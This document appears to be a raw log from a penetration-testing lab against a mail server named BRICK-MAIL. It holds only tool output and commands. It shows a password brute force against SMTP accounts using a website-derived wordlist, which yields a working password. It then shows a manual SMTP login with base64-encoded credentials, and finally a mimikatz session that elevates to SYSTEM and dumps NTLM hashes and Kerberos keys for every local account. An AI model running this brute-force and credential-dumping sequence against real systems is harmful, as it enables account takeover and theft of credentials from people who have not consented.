[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "fresh" - 237 of 864 [child 7] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "person" - 238 of 864 [child 11] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "services" - 239 of 864 [child 5] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "image" - 240 of 864 [child 12] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "carousel" - 241 of 864 [child 15] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "have" - 242 of 864 [child 4] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "been" - 243 of 864 [child 3] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "table" - 244 of 864 [child 14] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "online" - 245 of 864 [child 10] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "story" - 246 of 864 [child 8] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "takimata" - 247 of 864 [child 9] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "labor" - 248 of 864 [child 6] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "vision" - 249 of 864 [child 13] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "sanctus" - 250 of 864 [child 0] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "organic" - 251 of 864 [child 2] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "fastest" - 252 of 864 [child 1] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "door" - 253 of 864 [child 7] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "delivery" - 254 of 864 [child 11] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "best" - 255 of 864 [child 5] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "quality" - 256 of 864 [child 12] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "booking" - 257 of 864 [child 15] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "clients" - 258 of 864 [child 4] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "say" - 259 of 864 [child 3] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "menu" - 260 of 864 [child 14] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "found" - 261 of 864 [child 10] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "not" - 262 of 864 [child 8] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "book" - 263 of 864 [child 9] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "feel" - 264 of 864 [child 6] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "now" - 265 of 864 [child 13] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "your" - 266 of 864 [child 0] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "for" - 267 of 864 [child 2] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "off" - 268 of 864 [child 1] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "free" - 269 of 864 [child 7] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "address" - 270 of 864 [child 11] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "phone" - 271 of 864 [child 5] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "send" - 272 of 864 [child 12] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "message" - 273 of 864 [child 15] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "cloudflare" - 274 of 864 [child 4] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "stamatis" - 275 of 864 [child 3] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "filimena" - 276 of 864 [child 14] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "cathrine" - 277 of 864 [child 10] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "pontos" - 278 of 864 [child 8] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "chikondi" - 279 of 864 [child 9] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "titus" - 280 of 864 [child 6] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "hedvig" - 281 of 864 [child 13] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "laird" - 282 of 864 [child 0] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "rohit" - 283 of 864 [child 2] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "winifred" - 284 of 864 [child 1] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "aurelius" - 285 of 864 [child 7] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "omar" - 286 of 864 [child 11] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "are" - 287 of 864 [child 5] (0/0)
[ATTEMPT] target 10.10.76.202 - login "wrohit@brownbrick.co" - pass "who" - 288 of 864 [child 12] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)" - 289 of 864 [child 15] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "ipsum" - 290 of 864 [child 4] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "sed" - 291 of 864 [child 3] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "lorem" - 292 of 864 [child 14] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "dolor" - 293 of 864 [child 10] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "elitr" - 294 of 864 [child 8] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "sit" - 295 of 864 [child 9] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "amet" - 296 of 864 [child 6] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "est" - 297 of 864 [child 13] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "diam" - 298 of 864 [child 0] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "kasd" - 299 of 864 [child 2] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "tempor" - 300 of 864 [child 1] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "end" - 301 of 864 [child 7] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "start" - 302 of 864 [child 11] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "sea" - 303 of 864 [child 5] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "vero" - 304 of 864 [child 12] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "clita" - 305 of 864 [child 15] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "rebum" - 306 of 864 [child 4] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "duo" - 307 of 864 [child 3] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "stet" - 308 of 864 [child 14] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "erat" - 309 of 864 [child 10] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "javascript" - 310 of 864 [child 8] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "justo" - 311 of 864 [child 9] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "our" - 312 of 864 [child 6] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "contact" - 313 of 864 [child 13] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "eirmod" - 314 of 864 [child 2] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "magna" - 315 of 864 [child 7] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "testimonial" - 316 of 864 [child 11] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "about" - 317 of 864 [child 0] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "footer" - 318 of 864 [child 1] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "email" - 319 of 864 [child 5] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "font" - 320 of 864 [child 12] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "libraries" - 321 of 864 [child 3] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "stylesheet" - 322 of 864 [child 4] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "brik" - 323 of 864 [child 10] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "navbar" - 324 of 864 [child 14] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "invidunt" - 325 of 864 [child 15] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "protected" - 326 of 864 [child 6] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "home" - 327 of 864 [child 8] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "service" - 328 of 864 [child 9] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "reservation" - 329 of 864 [child 13] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "eos" - 330 of 864 [child 2] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "bricks" - 331 of 864 [child 0] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "name" - 332 of 864 [child 1] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "profession" - 333 of 864 [child 7] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "sanct" - 334 of 864 [child 11] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "client" - 335 of 864 [child 5] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "guberg" - 336 of 864 [child 12] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "dolore" - 337 of 864 [child 3] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "page" - 338 of 864 [child 4] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "takima" - 339 of 864 [child 10] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "header" - 340 of 864 [child 14] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "team" - 341 of 864 [child 15] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "usa" - 342 of 864 [child 8] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "york" - 343 of 864 [child 9] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "new" - 344 of 864 [child 6] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "street" - 345 of 864 [child 13] (0/0)
[ATTEMPT] target 10.10.76.202 - login "lhedvig@brownbrick.co" - pass "sign" - 346 of 864 [child 2] (0/0)
[587][smtp] host: 10.10.76.202   login: lhedvig@brownbrick.co   password: bricks

```


```
telnet 10.10.76.202 25                                    
Trying 10.10.76.202...
Connected to 10.10.76.202.
Escape character is '^]'.
220 BRICK-MAIL ESMTP
ehlo test.com
250-BRICK-MAIL
250-SIZE 20480000
250-AUTH LOGIN
250 HELP
AUTH LOGIN
334 VXNlcm5hbWU6
bGhlZHZpZ0Bicm93bmJyaWNrLmNv
334 UGFzc3dvcmQ6
YnJpY2tz
235 authenticated.
MAIL
550 Invalid syntax. Syntax should be MAIL FROM:<mailbox@domain>[crlf]
HELP
211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
DATA
503 Must have sender and recipient first.
MAIL
550 Invalid syntax. Syntax should be MAIL FROM:<mailbox@domain>[crlf]
HELP
211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
```

```
PS C:\Windows\Temp> mimikatz.exe
mimikatz.exe
mimikatz.exe : The term 'mimikatz.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ mimikatz.exe
+ ~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (mimikatz.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 

Suggestion [3,General]: The command mimikatz.exe was not found, but does exist in the current location. Windows PowerShell does not load commands from the current location by default. If you trust this command, instead type: ".\mimikatz.exe". See "get-help about_Command_Precedence" for more details.
PS C:\Windows\Temp> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug     
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process

mimikatz # token:elevate
ERROR mimikatz_doLocal ; "token:elevate" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

728     {0;000003e7} 1 D 25531          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0015bcb3} 0 D 2030110     BRICK-MAIL\wrohit       S-1-5-21-1966530601-3185510712-10604624-1014    (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 2089511     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : BRICK-MAIL
SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821
Local SID : S-1-5-21-1966530601-3185510712-10604624

SAMKey : 6e708461100b4988991ce3b4d8b1784e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 2dfe3378335d43f9764e581b856a662a

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 3d527dff081980ff09e87e492cebee23

* Primary:Kerberos-Newer-Keys *
    Default Salt : EC2AMAZ-QTVAAHMAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9484aadacd6c5994aed633bf92b6b3db31c57c932d2cd84a7fa635a0b3262806
      aes128_hmac       (4096) : cdda685dd630dd0796e5ddf38e22dce5
      des_cbc_md5       (4096) : 08340db613fb46b5
    OldCredentials
      aes256_hmac       (4096) : 50141e3b3b449512e393a66c32e7f89a131744eef5d8a3f6a8576919a810cda3
      aes128_hmac       (4096) : 0d717b42dbaf77bb7248b4bebf8bb3a6
      des_cbc_md5       (4096) : bc23a20170542f25
    OlderCredentials
      aes256_hmac       (4096) : 3b191b95e0b1fa83077319699194a79c8adea64e36bade3e959ccbbff42ea095
      aes128_hmac       (4096) : 318ecf3e0f6b969a949092706b519548
      des_cbc_md5       (4096) : 97f7bc3ead1f6ed6

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EC2AMAZ-QTVAAHMAdministrator
    Credentials
      des_cbc_md5       : 08340db613fb46b5
    OldCredentials
      des_cbc_md5       : bc23a20170542f25


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a1528cd40d99e5dfa9fa0809af998696

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
      des_cbc_md5       (4096) : ce9b2cabd55df4ce

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : ce9b2cabd55df4ce


RID  : 000003f1 (1009)
User : fstamatis
  Hash NTLM: 034c830cc313485a82e57a0d9dfa14e4

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 2ac6116566738883775d4c64894922ea

* Primary:Kerberos-Newer-Keys *
    Default Salt : BRICK-MAILfstamatis
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : b677f117b8f87d99bd2bec0dc2763404eb28d34e173722ec4d663d439b121c6d
      aes128_hmac       (4096) : d96cbd8c143e83959cf98b1b37bc5c08
      des_cbc_md5       (4096) : 017acb2f802a70a2

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : BRICK-MAILfstamatis
    Credentials
      des_cbc_md5       : 017acb2f802a70a2


RID  : 000003f2 (1010)
User : lhedvig
  Hash NTLM: 034c830cc313485a82e57a0d9dfa14e4

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9a9fe1153250a8c494ac7290b6e86bec

* Primary:Kerberos-Newer-Keys *
    Default Salt : BRICK-MAILlhedvig
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9cc3c27c2b6a7a6bfdcf4c9790aee0bd3012f337a8c452a0a5321ee6673c663b
      aes128_hmac       (4096) : 9d9bc45f622cf03fe08b86bd9ef45e5a
      des_cbc_md5       (4096) : d96770bce3ba327a

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : BRICK-MAILlhedvig
    Credentials
      des_cbc_md5       : d96770bce3ba327a


RID  : 000003f3 (1011)
User : oaurelius
  Hash NTLM: 034c830cc313485a82e57a0d9dfa14e4

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : bb03e2de24b406b050d5c4b110de5d94

* Primary:Kerberos-Newer-Keys *
    Default Salt : BRICK-MAILoaurelius
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 4e4d369c51fe79b5fa9cd372a6e2983b3d30ae43f7990701548775d087106532
      aes128_hmac       (4096) : ed9ae473c2213b7994c94e800cdb05ca
      des_cbc_md5       (4096) : 3167266bd54c3191

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : BRICK-MAILoaurelius
    Credentials
      des_cbc_md5       : 3167266bd54c3191


RID  : 000003f4 (1012)
User : pcathrine
  Hash NTLM: 034c830cc313485a82e57a0d9dfa14e4

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e52951c39856ffc37c81c2df09ccad3c

* Primary:Kerberos-Newer-Keys *
    Default Salt : BRICK-MAILpcathrine
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : ea10cad59f29a9c8daf61992e574781a095d9e4c6443da8170a7c07c051eda59
      aes128_hmac       (4096) : 93005a1203c24a41c9a05beee9662d13
      des_cbc_md5       (4096) : ae701fec345b3b8c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : BRICK-MAILpcathrine
    Credentials
      des_cbc_md5       : ae701fec345b3b8c


RID  : 000003f5 (1013)
User : tchikondi
  Hash NTLM: 034c830cc313485a82e57a0d9dfa14e4

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 5588ad299d776483b44417c0bd88861a

* Primary:Kerberos-Newer-Keys *
    Default Salt : BRICK-MAILtchikondi
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : eaa49b1593bb2c8240611ead9100002a3c520fcbfd103629da20046e5f093b10
      aes128_hmac       (4096) : ef093a7d07ae03cedfbe3098a7376706
      des_cbc_md5       (4096) : 6bab43253e6b4aa1

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : BRICK-MAILtchikondi
    Credentials
      des_cbc_md5       : 6bab43253e6b4aa1


RID  : 000003f6 (1014)
User : wrohit
  Hash NTLM: 8458995f1d0a4b0c107fb8e23362c814

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 5e0d9f81c0780c189099b7758d79a2e6

* Primary:Kerberos-Newer-Keys *
    Default Salt : BRICK-MAILwrohit
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 06cf703200c4fcd6ffaca428e96f18e5063dbb956c58aa7edee5b5acd7817b64
      aes128_hmac       (4096) : 8976fef34b9b36fea80c2d65c764ec5e
      des_cbc_md5       (4096) : 192558b67f7983a4
    OldCredentials
      aes256_hmac       (4096) : 227b60e30b0f1b929da7a0022c56de98121b6b8c151061be8f3923b823b6a85a
      aes128_hmac       (4096) : 82b5027730dd8a73890e09ea65cec047
      des_cbc_md5       (4096) : 13adae677067f7e9

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : BRICK-MAILwrohit
    Credentials
      des_cbc_md5       : 192558b67f7983a4
    OldCredentials
      des_cbc_md5       : 13adae677067f7e9


```